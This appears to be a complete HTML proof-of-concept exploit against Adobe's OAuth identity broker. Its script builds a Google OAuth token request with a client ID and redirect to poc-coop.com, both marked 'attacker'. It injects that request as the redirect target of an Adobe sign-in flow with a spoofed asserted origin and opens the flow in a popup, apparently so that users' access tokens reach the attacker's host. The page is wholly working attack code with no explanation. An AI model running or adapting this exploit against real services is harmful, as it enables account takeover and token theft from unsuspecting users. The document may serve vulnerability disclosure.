<!DOCTYPE html>
<html>
<head>
  <title>Adobe OAuth ClientID Swap PoC</title>
</head>
<body>
  <button onclick="launch()">Exploit</button>
  <div id="log"></div>
<script>
function log(msg){document.getElementById("log").innerHTML+=msg+"<br>";}

function buildAttackGoogleOAuth(){
  let client_id="50787447880-lej9pu0gkn41t1cacqcisjessmcrt9bf.apps.googleusercontent.com"; // attacker
  let redirect_uri="https://poc-coop.com/store.html"; // attacker
  let scope="openid profile email";
  return "https://accounts.google.com/o/oauth2/v2/auth?" +
    "client_id="+encodeURIComponent(client_id)+
    "&redirect_uri="+encodeURIComponent(redirect_uri)+
    "&response_type=token"+
    "&scope="+encodeURIComponent(scope);
}

function launch(){
  let attackOAuth=buildAttackGoogleOAuth();

  // Inject into Adobe broker's redirect_uri
  let tamperedAdobeURL="https://auth-light.identity.adobe.com/?" +
    "client_id=clio-playground-web" +
    "&response_type=token" +
    "&redirect_uri="+encodeURIComponent(attackOAuth) +
    "&environment=prod" +
    "&locale=en_US" +
    "&dt=true&wrapper=true&popup=true" +
    "&asserted_origin=https://firefly.adobe.com";

  log("â–¶ Opening tampered Adobe flow...");
  window.open(tamperedAdobeURL,"poc","width=600,height=700");
}
</script>
</body>
</html>
